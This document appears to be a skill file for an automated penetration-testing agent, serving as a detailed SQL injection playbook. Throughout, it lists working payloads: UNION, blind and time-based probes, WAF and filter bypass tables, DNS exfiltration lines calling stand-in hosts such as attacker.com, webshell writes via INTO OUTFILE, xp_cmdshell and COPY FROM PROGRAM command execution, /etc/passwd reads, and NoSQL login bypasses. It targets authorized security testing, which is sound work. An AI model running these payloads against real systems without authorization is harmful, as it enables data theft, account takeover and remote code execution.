---
name: sql-injection
description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
depends_on: []
---

# SQL Injection

SQLi remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect.

## Discovery Signals

| Signal | Where to Find | Why Vulnerable |
|---|---|---|
| Error mentioning SQL syntax, column count, or quote | Any response body/header after `'` probe | Backend concatenates input into SQL without parameterization |
| Numeric IDs in URL path segments (`/users/123`, `/lead/uuid`) | PUT/DELETE/PATCH path params, REST resource IDs | Devs trust UUID/int shape, skip ORM — manual `WHERE id='${path}'` |
| `search`, `q`, `query`, `keyword`, `filter`, `term` params | Search bars, autocomplete endpoints, listing pages | `LIKE '%$input%'` built by concatenation in legacy PHP/Java apps |
| `sort`, `order`, `orderBy`, `groupBy`, `field` params | Table/list/grid pages with column sorting | ORDER BY/GROUP BY clauses cannot use bound params in many dialects |
| `offset`, `limit`, `rnum`, `page`, `start`, `from` params | Paginated lists, infinite scroll APIs | Integer-context concat; no quotes needed — WAFs miss numeric injection |
| Bulk import/CSV upload accepting user data | Admin panels, data import wizards, batch endpoints | Each CSV cell flows into INSERT without per-cell parameterization |
| Report builder/export with dynamic filters | Business intelligence dashboards, analytics exporters | Filter predicates assembled from user-chosen columns/operators |
| `Referer`, `User-Agent`, `X-Forwarded-For` headers | Any page with analytics/logging — enterprise/gov apps | Server `INSERT INTO access_log VALUES(..., '$header', ...)` |
| Custom OAuth endpoints (`/api/v1/token`, `/auth/login`) | Auth/identity surfaces on custom-built (non-library) OAuth | `WHERE refresh_token = '$input'` lookup by concatenation |
| JSON-wrapped params (`?data={"acctid":"123"}`) | APIs accepting serialized structures via GET/POST | JSON deserialized server-side, leaf values concatenated into SQL |
| Array params (`groups[]=1&groups[]=2`) | PHP apps with multi-select, checkbox groups | `implode(", ", $array)` into `IN()` clause — no per-element escape |
| Error response differs for `AND 1=1` vs `AND 1=2` appended | Any param returning variable-length content | Boolean-controllable predicate proves injection without error leak |

## Attack Surface

**Databases**
- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, reporting/exporters

**Input Locations**
- Path/query/body/header/cookie
- Mixed encodings (URL, JSON, XML, multipart)
- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs
- JSON coercion or array containment operators
- Batch/bulk endpoints and report generators that embed filters directly

## Detection Channels

**Error-Based**
- Provoke type/constraint/parser errors revealing stack/version/paths

**Boolean-Based**
- Pair requests differing only in predicate truth
- Diff status/body/length/ETag

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- Use subselect gating to avoid global latency noise

**Out-of-Band (OAST)**
- DNS/HTTP callbacks via DB-specific primitives

## DBMS Primitives

### MySQL

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older), JSON functions for error shaping
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege, secure_file_priv)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- Time: `SLEEP(n)`, `BENCHMARK`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS funcs sometimes leak

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`
- Error-based: raise exception via unsupported casts or division by zero; `xpath()` errors in xml2
- OOB: `COPY (program ...)` or dblink/foreign data wrappers (when enabled); http extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (requires superuser), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` with lateral/CTE for blind extraction

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) if enabled
- Exec: `xp_cmdshell` (often disabled), `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy functions cause measurable delays
- Error-based: convert/parse, divide by zero, `FOR XML PATH` leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permissions dependent)
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date` conversions, `XMLType`
- File: `UTL_FILE` with directory objects (privileged)

## Database-Specific Cheat Sheet

| Technique | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| String concat | `CONCAT(a,b)`, `'a' 'b'` | `a\|\|b` | `a+b` | `a\|\|b` | `a\|\|b` |
| Conditional | `IF(c,t,f)` | `CASE WHEN c THEN t ELSE f END` | `CASE WHEN c THEN t ELSE f END` | `CASE WHEN c THEN t ELSE f END` | `CASE WHEN c THEN t ELSE f END` |
| Subquery exfil | `(SELECT x FROM t LIMIT 1)` | `(SELECT x FROM t LIMIT 1)` | `(SELECT TOP 1 x FROM t)` | `(SELECT x FROM t WHERE ROWNUM=1)` | `(SELECT x FROM t LIMIT 1)` |
| Stacked queries | Supported (rare in web) | Supported | **Yes** (primary vector) | Via PL/SQL blocks | Supported |
| File read | `LOAD_FILE('/etc/passwd')` | `pg_read_file()` (superuser) | `OPENROWSET(BULK...)` | `UTL_FILE.GET_LINE` | N/A |
| DNS exfil | `LOAD_FILE('\\\\data.attk\\a')` | `dblink('host=data.attk')` | `xp_dirtree '\\\\data.attk\\a'` | `UTL_HTTP.REQUEST('http://data.attk')` | N/A |
| RCE path | `INTO OUTFILE` webshell | `COPY ... FROM PROGRAM` | `xp_cmdshell` | `DBMS_SCHEDULER` job | N/A |

## Key Vulnerabilities

### UNION-Based Extraction

- Determine column count and types via `ORDER BY n` and `UNION SELECT null,...`
- Align types with `CAST`/`CONVERT`; coerce to text/json for rendering
- When UNION is filtered, switch to error-based or blind channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Binary search on character space for fewer requests
- Encode outputs (hex/base64) to normalize
- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to minimize noise and bypass strict response paths
- Embed data in DNS labels or HTTP query params
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks
- Privilege changes: update role/plan/feature flags when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, `xp_cmdshell` redirection
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER clauses
- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
- JSON containment operators exposed by ORMs (e.g., `@>` in PostgreSQL) with raw fragments
- Parameter mismatch: partial parameterization where operators or lists remain unbound (`IN (...)`)

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` for boolean channels
- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
- Full-text/search helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with payload mixing
- XML/JSON functions: error generation via malformed documents/paths

## Second-Order SQLi

Injected data is stored safely, then used unsafely in a different query context later. The injection and the trigger are separated in time and endpoint.

**Common patterns:**
- Username/display name stored, later concatenated into admin search/user-listing query
- Profile field (bio, company, address) stored, later used in report generator `WHERE` clause
- CSV/bulk-imported data stored in staging table, later `SELECT INTO` or batch-processed with concatenation
- Comment/feedback stored, then an admin dashboard query uses `LIKE '%$comment_text%'` for filtering
- SQLi result written to DB column A, column A read by a second feature that builds SQL from it (nested/inception SQLi — H1 CTF Day 11 pattern: SQLi output feeds image URL builder, which feeds internal API with its own SQL)

**Detection:** inject a time-delay payload into a stored field (`username`, `bio`), then trigger the second query by visiting the admin search/report page. If delay appears on the second request, second-order confirmed. Mark stored fields with unique sentinel strings and grep server logs for them.

## NoSQL Injection Crossover

When a target uses both SQL and NoSQL databases, test both surfaces. MongoDB/Elasticsearch/Redis injection patterns:

| Target | Operator Injection | Example Payload |
|---|---|---|
| MongoDB (Meteor/Express) | `$ne`, `$gt`, `$regex`, `$where`, `$or` as object keys | `{"username":{"$ne":""},"password":{"$ne":""}}` |
| MongoDB `$where` | JS execution in query predicate | `$where: "this.password.match(/^a/) && sleep(5000)"` |
| MongoDB `$regex` | Wildcard match bypassing exact-match auth | `{"username":"admin","password":{"$regex":".*"}}` |
| Elasticsearch | Query DSL injection via `_search` body | `{"query":{"match":{"field":"*"}}}` or script injection |
| Redis (Lua eval) | `EVAL` with user-controlled script body | `EVAL "redis.call('keys','*')" 0` |

**Cross-surface signal:** if the app has both `/api/search` (Elasticsearch) and `/api/users` (SQL), test both. Object-typed params (`param[key]=val`, JSON objects where strings expected) trigger NoSQL; string-typed params trigger SQL.

## Truncation and Type Juggling

**SQL truncation attacks**: MySQL silently truncates `VARCHAR(N)` values beyond N characters. Register `admin                      x` (spaces + extra char) — stored as `admin` after truncation. Login query matches the real admin row. Works when INSERT truncates but SELECT uses exact match on the truncated value.

**PHP + MySQL type juggling**: `0 == "any_string"` is true in PHP loose comparison. If password check uses `==` instead of `===` after a SQL fetch, password `0` matches any non-numeric stored hash. Similarly, `WHERE id = '0admin'` MySQL casts `'0admin'` to integer `0`, matching `id=0`.

**Implicit casting abuse**: MySQL `WHERE varchar_col = 0` matches all rows where the column starts with a non-numeric character (cast to 0). Inject numeric `0` where strings are expected to bypass filters.

## Bypass Techniques

**Whitespace/Spacing**
- `/**/`, `/**/!00000`, comments, newlines, tabs
- `0xe3 0x80 0x80` (ideographic space)

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks/quotes, case folding

**Numeric Tricks**
- Scientific notation, signed/unsigned, hex (`0x61646d696e`)

**Encodings**
- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
- `char()`/`CONCAT_ws` to build tokens

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to hide payload shape

## WAF Bypass Matrix

| WAF/Filter | Bypass Technique | Example Payload |
|---|---|---|
| ModSecurity CRS | Comment-wrapped keywords + case randomization | `/*!50000UniOn*/ /*!50000SeLeCt*/ 1,2,@@version` |
| Cloudflare | Chunked Transfer-Encoding to split payload across chunks | `Transfer-Encoding: chunked` with payload split at keyword boundary |
| AWS WAF | HPP (HTTP Parameter Pollution) — duplicate param with split payload | `?id=1&id=' UNION SELECT 1,2,3--` (backend joins them) |
| Akamai | Scientific notation for numeric context, inline comments | `1e0 UNION SELECT 1,2,3` or `1 /*!UNION*/ /*!SELECT*/ 1,2,3` |
| Imperva/Incapsula | Unicode normalization + double URL encoding | `%2527 UNION%2520SELECT%25201,2,3` |
| Custom regex `UNION\s+SELECT` | Replace whitespace with comment | `UNION/**/SELECT`, `UNION%0aSELECT`, `UNION%09SELECT` |
| Custom `SLEEP\(` blocked | XOR/IF wrapper, `BENCHMARK` fallback | `'XOR(if(now()=sysdate(),sleep(5),0))OR'` |
| Custom quote `'` blocked | Hex encoding, `CHAR()` | `UNION SELECT CHAR(97,100,109,105,110)` or `0x61646d696e` |
| Custom `AND`/`OR` blocked | Symbolic operators, double-pipe | `1 && 1=1`, `1 \|\| 1=1`, `1 XOR 0` |
| Custom `--` comment blocked | Alternative terminators | `#`, `/*`, `;%00`, `' AND '1'='1` (balanced quotes, no comment needed) |
| Input length limit (<50 chars) | Stacked short queries, `OR 1=1` | `' OR 1=1#` (11 chars), `1;SELECT 1#` |

## Filter Bypass Compendium

| Blocked | Bypass | Notes |
|---|---|---|
| Space (` `) | `/**/`, `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `+`, `%a0` | Inline comments most reliable; `+` works in URL query context |
| Single quote (`'`) | Hex literals `0x`, `CHAR()`, backslash `\'`, double-encoding `%2527` | Hex for string comparisons: `WHERE name=0x61646d696e` |
| Double quote (`"`) | Backtick `` ` `` (MySQL identifier), `%2522`, `CHAR(34)` | MySQL allows backtick as identifier quote |
| `UNION` | `UNiOn`, `UN/**/ION`, `/*!50000UNION*/`, subquery in `WHERE` | If all UNION blocked, switch to error-based/blind |
| `SELECT` | `SeLeCt`, `SE/**/LECT`, `/*!SELECT*/`, hex of needed data | Combine with case randomization |
| `AND`/`OR` | `&&`/`\|\|`, `XOR`, `BETWEEN`, `IN`, `LIKE`, `RLIKE` | `1 && (SELECT...)` same as `1 AND (SELECT...)` |
| `=` | `LIKE`, `RLIKE`, `REGEXP`, `IN()`, `BETWEEN x AND x`, `<>` negated | `WHERE user LIKE 'admin'` replaces `WHERE user='admin'` |
| Comment (`--`) | `#`, `;%00`, balanced quotes `' AND '1'='1`, `/*` | `%23` for `#` in URL context |
| `INFORMATION_SCHEMA` | `information_schema` (case), short aliases, MySQL `.` syntax | Or skip: brute column names with `UNION SELECT col FROM known_table` |
| Comma (`,`) | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` | JOIN-based column separation avoids commas entirely |

## Testing Methodology

1. **Identify query shape** - SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET
2. **Determine input influence** - User input in identifiers vs values
3. **Confirm injection class** - Reflective errors, boolean diffs, timing, or out-of-band callbacks
4. **Choose quietest oracle** - Prefer error-based or boolean over noisy time-based
5. **Establish extraction channel** - UNION (if visible), error-based, boolean bit extraction, time-based, or OAST/DNS
6. **Pivot to metadata** - version, current user, database name
7. **Target high-value tables** - auth bypass, role changes, filesystem access if feasible

## Persistence & Retry Discipline (MANDATORY)

Never mark a parameter "not SQL-injectable" after 1-2 payloads. SQLi detection requires testing 4 independent classes — a single UNION attempt failing means UNION isn't viable, NOT that the param is safe. Run the full class matrix before dismissing.

**Four-class probe matrix — each parameter gets ONE attempt from EACH class before verdict:**

| Class | Probe payload | Signal interpreted |
|---|---|---|
| Error-based | `'`, `"`, `\`, `'))`, `"/*`, `%27` (URL-encoded) | DB error in response (mentions SQL/syntax/quote/column) → confirmed. Clean 200 → move to next class. |
| Boolean-blind | `' OR '1'='1`, `' AND '1'='2`, `' OR 1=1 --`, `' AND 1=2 --` | Response size/content/status differs between the two → confirmed. |
| Time-based | `' OR SLEEP(5) --`, `'; WAITFOR DELAY '0:0:5' --`, `' AND pg_sleep(5) --`, `' AND 1 = (SELECT 1 FROM pg_sleep(5)) --` | Request takes 5s+ → confirmed. (Use 2-3s min to reduce noise.) |
| UNION-based | `' UNION SELECT NULL --`, iterate column count: `UNION SELECT NULL,NULL --`, `UNION SELECT NULL,NULL,NULL --` | Union returns extra row OR different error (column count mismatch) → confirmed. |
| Out-of-band | `'; EXEC xp_dirtree '\\\\$OAST\\foo' --`, `' AND (SELECT LOAD_FILE('\\\\$OAST\\a'))`, DNS-resolving payloads | OAST callback fires → confirmed (works when no in-band oracle). |

**Rule**: Try all 4 in-band classes + OAST for every parameter before filing "no SQLi found". One failed UNION does not mean no injection — the column count may be wrong, or it may be a non-SELECT query, or reflection may be sanitized but boolean diff is not.

**Encoding variants** — repeat per class if in-band tests fail:
- URL encode: `%27` for `'`, `%20` for space, `%23` for `#`
- Double encode: `%2527`
- Comment variants: `--`, `#`, `/**/`, `-- -` (space after), `/*!50000...*/` (MySQL versioned)
- Case randomization (WAF bypass): `uNiOn SeLeCt`
- Alternate whitespace: `\t`, `\n`, `%0b`, `/**/`, `+`
- Quote variants: `'`, `"`, `\'`, `\\'`, `%27`, `%u0027`

**Per-DB syntax variants** — when fingerprint is unclear, rotate dialect:
- MySQL: `sleep(5)`, `benchmark()`, `-- -`
- PostgreSQL: `pg_sleep(5)`, `||`, `--`
- SQL Server: `WAITFOR DELAY`, `xp_cmdshell`, `--`
- SQLite: `randomblob()`, empty delay, `--`, UNION behaves differently
- Oracle: `DBMS_PIPE.RECEIVE_MESSAGE`, `||`, `--`

**False-negative signals that need re-probe**:
- Clean 200 with no error: try boolean and time-based next
- Generic 400: try URL-encoded payloads; may be WAF pre-filter
- Response size identical across payloads: try time-based — timing leak may still exist
- 302 redirect: follow to see if the redirect target leaks differences

## Chain Patterns

| Chain | Steps | Combined Severity |
|---|---|---|
| SQLi → RCE | SQLi `INTO OUTFILE` writes webshell, or `xp_cmdshell`/`COPY FROM PROGRAM` executes OS commands | Critical |
| SQLi → auth bypass → admin takeover | `' OR 1=1 --` in login form, or extract admin password hash → crack → login | Critical |
| Blind SQLi → data exfil → account takeover | Time/boolean extraction of password hashes or OAuth tokens → impersonate users | High-Critical |
| Second-order SQLi → stored XSS | SQLi payload stored in DB field → rendered unescaped in admin dashboard → XSS fires on admin visit | High |
| SQLi → file read → source code → more vulns | `LOAD_FILE('/var/www/config.php')` leaks DB creds, API keys → lateral movement | Critical |
| SQLi in search → export → PII breach | Inject `UNION SELECT email,password FROM users` into search results → export to CSV/PDF | High-Critical |
| Header SQLi → log poisoning → RCE | `Referer: <?php system($_GET[cmd]); ?>` stored via SQLi INSERT → access log served as PHP | Critical |
| SQLi (nested) → SSRF → internal API | SQL output controls server-side URL fetch (image/PDF gen) → pivot to internal endpoints | Critical |

## Validation

1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
2. Extract verifiable metadata (version, current user, database name) using the established channel
3. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope
4. Provide reproducible requests that differ only in the injected fragment
5. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant)

## False Positives

- Generic errors unrelated to SQL parsing or constraints
- Static response sizes due to templating rather than predicate truth
- Artificial delays from network/CPU unrelated to injected function calls
- Parameterized queries with no string concatenation, verified by code review

## Impact

- Direct data exfiltration and privacy/regulatory exposure
- Authentication and authorization bypass via manipulated predicates
- Server-side file access or command execution (platform/privilege dependent)
- Persistent supply-chain impact via modified data, jobs, or procedures

## Pro Tips

1. Pick the quietest reliable oracle first; avoid noisy long sleeps
2. Normalize responses (length/ETag/digest) to reduce variance when diffing
3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise
4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available
5. Treat ORMs as thin wrappers: raw fragments often slip through; audit `whereRaw`/`orderByRaw`
6. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly
7. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels
8. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types
9. Validate mitigations with negative tests and code review; parameterize operators/lists correctly
10. Document exact query shapes; defenses must match how the query is constructed, not assumptions
11. Test GraphQL `query` and `mutation` arguments — variables in resolvers often hit raw SQL, especially custom filters, sort arguments, and `where` clauses in hand-rolled resolvers
12. Fuzz bulk/batch endpoints (CSV import, bulk update, multi-row INSERT) — each cell/row is a separate injection point; devs parameterize the first row and `implode()` the rest
13. Inject into headers logged to DB: `X-Forwarded-For`, `Referer`, `User-Agent`, `Accept-Language` — use `sqlmap --level=5` or explicit `-p` header targeting
14. ORDER BY injection differs from WHERE injection: no UNION possible, use `CASE WHEN (condition) THEN col1 ELSE col2 END` for boolean channel, or `(SELECT CASE WHEN ... THEN 1/0 ELSE 1 END)` for error-based
15. Optimize time-based blind: binary search ASCII values (7 requests per char vs 128), or use conditional errors instead of `SLEEP` — `(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)` returns instantly and avoids rate-limit triggers
16. Test stored procedures/functions: `EXEC sp_name 'input'` or `SELECT func('input')` — these often build internal SQL via concatenation even when the calling query is parameterized
17. For every acquired company in a program's scope, enumerate the original company's infrastructure -- acquired domains retain legacy stacks with unpatched SQLi ($133K)
18. WordPress plugin SQLi pipeline: enumerate `wp_ajax_nopriv_*` actions, trace each handler to DB queries, grep for un-prepared `$wpdb->query()` calls ($4.5K)
19. Filter-passthrough endpoints with field-restricted output are blind-injection oracles -- any endpoint accepting structured queries (MongoDB, Solr, custom DSL) with limited output is a blind SQLi channel
20. Legacy PHP integer-parameter sweep: fingerprint `X-Powered-By: PHP/<version>`, find numeric URL parameters, inject `0'XOR(if(now()=sysdate(),sleep(N),0))XOR'Z` as universal MySQL probe

## Summary

Modern SQLi succeeds where authorization and query construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets SQL.
